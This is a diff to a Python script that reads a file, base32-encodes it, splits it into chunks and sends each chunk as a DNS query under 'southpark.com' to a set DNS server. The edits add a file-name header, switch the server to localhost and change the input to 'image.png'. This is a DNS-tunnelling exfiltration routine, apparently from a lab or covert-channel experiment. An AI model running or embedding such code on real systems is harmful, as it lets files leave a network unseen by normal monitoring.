@@ -25,7 +25,7 @@ import base64
 import time
 import select
 
-dns_server = '192.168.57.54'
+dns_server = '127.0.0.1'
 domain_name = 'southpark.com'
 
 def dns_udp_handle(data):
@@ -41,14 +41,15 @@ def dns_udp_handle(data):
                 break                
 
                      
-def send_over_dns(data):
+def send_over_dns(data, file_name):
     domain_name = "southpark.com"
     resp = []
-    for i in range(0, len(data), 16):
-        if i+28 > len(data) - 1:
+    resp.append(base64.b32encode(b'#FILE# ' + file_name.encode()))
+    for i in range(0, len(data), 32):
+        if i+32 > len(data) - 1:
             resp.append(data[i:len(data)])
             break
-        resp.append(data[i:i+16])
+        resp.append(data[i:i+32])
     resp.append(base64.b32encode(b"#END#"))
     for chunk in resp:
         ch = str(chunk).strip("'b")
@@ -59,8 +60,9 @@ def send_over_dns(data):
 if __name__ == "__main__":
 
     encoded_data = None
-    with open('test.txt', 'rb') as obj:
+    file_name = 'image.png'
+    with open(file_name, 'rb') as obj:
         data = obj.read()
         encoded_data = base64.b32encode(data)
         encoded_data = str(encoded_data).strip("'b")
-    send_over_dns(encoded_data)
+    send_over_dns(encoded_data, file_name)
